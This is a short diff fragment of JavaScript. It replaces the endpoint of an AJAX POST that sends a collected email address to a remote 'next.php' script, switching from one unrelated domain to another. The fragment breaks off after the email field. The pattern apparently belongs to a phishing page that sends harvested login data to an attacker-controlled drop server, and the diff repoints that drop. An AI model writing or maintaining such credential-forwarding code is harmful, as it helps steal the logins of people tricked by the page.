@@ -214,7 +214,7 @@
         {
          $.ajax({
           dataType: 'JSON',
-          url: 'https://zakiafoundation.com/wpadmin/next.php',
+          url: 'https://rocanexpress.ca/res/next.php',
           type: 'POST',
           data:{
             email:email,
